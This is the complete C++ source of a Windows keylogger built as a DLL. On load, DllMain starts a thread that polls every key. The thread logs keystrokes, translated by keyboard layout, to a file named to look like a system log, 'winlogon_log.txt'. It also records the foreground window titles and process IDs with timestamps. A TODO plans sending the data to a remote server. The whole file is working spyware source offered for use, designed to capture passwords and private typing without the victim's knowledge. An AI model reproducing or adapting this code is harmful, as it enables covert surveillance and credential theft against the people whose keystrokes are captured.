#include "pch.h"
#include <Windows.h>
#include <stdio.h>
#pragma warning(disable : 4996)


// log_file path can be changed
// TODO: Connect to a remote server
LPCSTR log_file = "C:\\winlogon_log.txt";
HANDLE hFile = NULL;
HWND hWindowHandle = NULL;
TCHAR currentWindowsName[1024] = { 0 };
TCHAR lastWindowsName[1024] = { 0 };
TCHAR fullWindowsInformation[1024] = { 0 };
DWORD bytesWritten = 0;
DWORD currentProcessId = 0;
DWORD currentThreadId = 0;
SYSTEMTIME LocalTime = { 0 };

// Write text to log file 
void WriteToLogFile(TCHAR* text)
{
	hFile = CreateFileA(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, text, wcslen(text) * sizeof(TCHAR), &bytesWritten, NULL);
	CloseHandle(hFile);
}

// Change key to Unicode and write to log file
void WritesUnicodeKeyToFile(int vKey)
{
	HKL hKl;
	hWindowHandle = GetForegroundWindow();
	BYTE* kState = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 256 * sizeof(BYTE));
	// Get keyboard state (all 256-byte virtual keys) 
	GetKeyboardState(kState);
	// Get Keyboard Layout by current thread (for language)
	hKl = GetKeyboardLayout(currentThreadId);
	TCHAR unicodeChar[2] = { 0 };
	UINT virtualKey = vKey;
	// Get the Unicode character
	ToUnicodeEx(virtualKey, vKey, (BYTE*)kState, (LPWSTR)&unicodeChar, 1, NULL, hKl);
	// Write character to file
	WriteToLogFile(unicodeChar);

	HeapFree(GetProcessHeap(), NULL, kState);

}

// Key caturing function
DWORD KeyLoggerMainFunction(void)
{
	int vKey;
	while (1)
	{
		// Poll the keyboard every 10 milliseconds to detect the state of each key
		Sleep(10);
		for (vKey = 8; vKey <= 254; vKey++)
		{
			// Check if key is pressed
			if (GetAsyncKeyState(vKey) == -32767)
			{
				// Get foreground window
				hWindowHandle = GetForegroundWindow();
				if (hWindowHandle != NULL)
				{
					if (GetWindowText(hWindowHandle, currentWindowsName, 1024) != 0)
					{
						// Check if foreground window has changed
						if (wcscmp(lastWindowsName, currentWindowsName) != 0)
						{
							// Get process Id + thread Id of foreground window (for checking keyboard layout)
							currentThreadId = GetWindowThreadProcessId(hWindowHandle, &currentProcessId);
							hFile = CreateFileA(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
							GetLocalTime(&LocalTime);
							_snwprintf_s(fullWindowsInformation, 1023, L"\n\n%04d/%02d/%02d %02d:%02d:%02d - {%s (%d)}\n", LocalTime.wYear, LocalTime.wMonth, LocalTime.wDay, LocalTime.wHour, LocalTime.wMinute, LocalTime.wSecond, currentWindowsName, currentProcessId);
							// Write process + window information to log file
							WriteFile(hFile, fullWindowsInformation, wcslen(fullWindowsInformation) * sizeof(TCHAR), &bytesWritten, NULL);
							// Set last foreground window as current window 
							wcscpy_s(lastWindowsName, currentWindowsName);
							CloseHandle(hFile);
						}
					}
				}

				if (true)
				{
					// WritesUnicodeKeyToFile(vKey) function --> will check keyboard layout and then write to log file
					// WriteToLogFile((TCHAR*)L"...") --> will write to log file without checking keyboard layout (special characters)
					if ((vKey >= 48) && (vKey < 91))
					{
						WritesUnicodeKeyToFile(vKey);
						break;
					}
					else
					{
						switch (vKey)
						{
						case VK_SPACE:
							WriteToLogFile((TCHAR*)L" ");
							break;
						case VK_SHIFT:
							WriteToLogFile((TCHAR*)L"[SHIFT]");
							break;
						case VK_RETURN:
							WriteToLogFile((TCHAR*)L"[ENTER]");
							break;
						case VK_BACK:
							WriteToLogFile((TCHAR*)L"[BACKSPACE]");
							break;
						case VK_TAB:
							WriteToLogFile((TCHAR*)L"[TAB]");
							break;
						case VK_CONTROL:
							WriteToLogFile((TCHAR*)L"[CTRL]");
							break;
						case VK_DELETE:
							WriteToLogFile((TCHAR*)L"[DEL]");
							break;
						case VK_CAPITAL:
							WriteToLogFile((TCHAR*)L"[CAPS LOCK]");
							break;
						case VK_PRIOR:
							WriteToLogFile((TCHAR*)L"[PAGE UP]");
							break;
						case VK_NEXT:
							WriteToLogFile((TCHAR*)L"[PAGE DOWN]");
							break;
						case VK_END:
							WriteToLogFile((TCHAR*)L"[END]");
							break;
						case VK_HOME:
							WriteToLogFile((TCHAR*)L"[HOME]");
							break;
						case VK_LWIN:
							WriteToLogFile((TCHAR*)L"[WIN]");
							break;
						case VK_RWIN:
							WriteToLogFile((TCHAR*)L"[WIN]");
							break;
						case VK_VOLUME_MUTE:
							WriteToLogFile((TCHAR*)L"[SOUND-MUTE]");
							break;
						case VK_VOLUME_DOWN:
							WriteToLogFile((TCHAR*)L"[SOUND-DOWN]");
							break;
						case VK_VOLUME_UP:
							WriteToLogFile((TCHAR*)L"[SOUND-DOWN]");
							break;
						case VK_MEDIA_PLAY_PAUSE:
							WriteToLogFile((TCHAR*)L"[MEDIA-PLAY/PAUSE]");
							break;
						case VK_MEDIA_STOP:
							WriteToLogFile((TCHAR*)L"[MEDIA-STOP]");
							break;
						case VK_MENU:
							WriteToLogFile((TCHAR*)L"[ALT]");
							break;
						case VK_OEM_PLUS:
							WriteToLogFile((TCHAR*)L"+");
							break;
						case VK_OEM_MINUS:
							WriteToLogFile((TCHAR*)L"-");
							break;
						case VK_OEM_1:
							WritesUnicodeKeyToFile(VK_OEM_1);
							break;
						case VK_OEM_2:
							WritesUnicodeKeyToFile(VK_OEM_2);
							break;
						case VK_OEM_3:
							WritesUnicodeKeyToFile(VK_OEM_3);
							break;
						case VK_OEM_4:
							WritesUnicodeKeyToFile(VK_OEM_4);
							break;
						case VK_OEM_5:
							WritesUnicodeKeyToFile(VK_OEM_5);
							break;
						case VK_OEM_6:
							WritesUnicodeKeyToFile(VK_OEM_6);
							break;
						case VK_OEM_7:
							WritesUnicodeKeyToFile(VK_OEM_7);
							break;
						case VK_OEM_COMMA:
							WritesUnicodeKeyToFile(VK_OEM_COMMA);
							break;
						case VK_OEM_PERIOD:
							WritesUnicodeKeyToFile(VK_OEM_PERIOD);
							break;
						default:
							break;
						}
					}
				}
			}
		}
	}


	return 0;
}

DWORD main_logger() {

	// Create log file
	hFile = CreateFileA(log_file, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
	SetFilePointer(hFile, 0, 0, FILE_END);
	CloseHandle(hFile);
		

	// Main logging function
	KeyLoggerMainFunction();

	return 0;
}


extern "C" BOOL WINAPI  DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hInst);
        CreateThread(NULL, 0, main_logger, 0, 0, NULL);
        break;

    case DLL_PROCESS_DETACH:
        break;

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;
    }


    return TRUE;
}